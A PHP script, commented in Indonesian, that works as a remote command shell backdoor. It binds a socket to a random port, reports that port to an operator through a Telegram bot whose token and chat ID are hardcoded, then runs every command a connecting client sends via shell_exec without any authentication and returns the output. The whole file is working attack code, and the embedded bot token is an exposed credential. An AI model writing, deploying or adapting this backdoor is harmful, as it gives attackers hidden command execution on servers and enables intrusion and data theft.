<?php
// Membuat socket
$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

// Mengikat socket ke alamat dan port secara acak
socket_bind($socket, '0.0.0.0', 0);

// Mendapatkan nomor port yang telah diikat secara acak
socket_getsockname($socket, $ip, $port);

// Mengirim pesan ke Telegram dengan port baru yang akan digunakan
$botToken = '6377524606:AAGueU8euEgPDZHuV_wr31DeTxwKH9qhwso';
$chatId = '5498177352';
$message = "Server telah memulai dengan port baru: $port";
$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

// Mengirim pesan ke Telegram menggunakan cURL
$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Mendengarkan koneksi masuk
socket_listen($socket);

echo "Server sedang mendengarkan di port $port...\n";

// Menerima koneksi
$client_socket = socket_accept($socket);

// Pesan saat koneksi berhasil terhubung
echo "Klien berhasil terhubung!\n";

while (true) {
    // Membaca data dari koneksi
    $data = socket_read($client_socket, 1024);

    // Menghapus karakter newline dan spasi ekstra dari data
    $data = trim($data);

    // Menjalankan perintah pada sistem jika data tidak kosong
    if (!empty($data)) {
        if ($data === 'exit') {
            // Perintah untuk keluar
            echo "Server dihentikan oleh klien.\n";
            socket_close($client_socket);
            socket_close($socket);
            exit; // Keluar dari skrip
        } elseif (strpos($data, 'cd ') === 0) {
            // Perintah untuk berpindah direktori
            $dir = substr($data, 3); // Mengambil direktori dari perintah
            if (chdir($dir)) {
                // Jika berhasil berpindah direktori
                $output = "Berhasil pindah ke direktori: $dir";
            } else {
                // Jika gagal berpindah direktori
                $output = "Gagal pindah ke direktori: $dir";
            }
        } else {
            // Perintah selain 'cd' atau 'exit', menjalankan perintah sistem
            $output = shell_exec($data);
        }

        // Mengirim output ke klien
        socket_write($client_socket, $output, strlen($output));

        // Menambahkan baris kosong setelah output
        socket_write($client_socket, "\n", 1);
    }
}

socket_close($client_socket);
socket_close($socket);
?>
